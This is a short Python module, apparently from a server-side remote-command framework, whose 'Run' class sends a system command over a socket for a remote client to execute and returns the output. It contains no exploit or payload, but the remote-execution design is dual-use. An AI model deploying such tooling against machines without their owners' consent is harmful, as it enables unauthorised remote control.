from Server import Server

class Run:
    """
    Represents a Submodule that extends the Module class.
    This class handles the modular functionality of sending a system command for the remote client to execute it.

        Attributes:
        connection (socket): The connection object created in the server with socket.accept() where data will be sent and received.
        command (str): The desired command to execute in the remote client.
    """

    def __init__(self, connection, command):
        """
        Initializes the Submodule with a name and description.
        """

        self.name = "Run"
        self.description = "This module handles the process of executing a system command in the remote client."

        self._connection = connection
        self._command = command

    def sendCommand(self):
        """
        Sends the command to execute to the client
        """

        #Send command
        self._connection.send(b'command' + self._command.encode())

    def receiveOutput(self):
        """
        Receives the stdout of the command sent
        """

        contents = b''

        # Get data
        while True:
            try:
                chunk = self._connection.recv(1024)
                if not chunk:
                    break
                contents += chunk
            except:
                break

        return contents

    def execute(self):
        """
        Executes the Submodule.
        """

        print(f"Executing Submodule {self.name} - {self.description}")
        server = Server.getInstance()

        self.sendCommand()

        stdout = self.receiveOutput()

        return stdout.decode('utf-8')

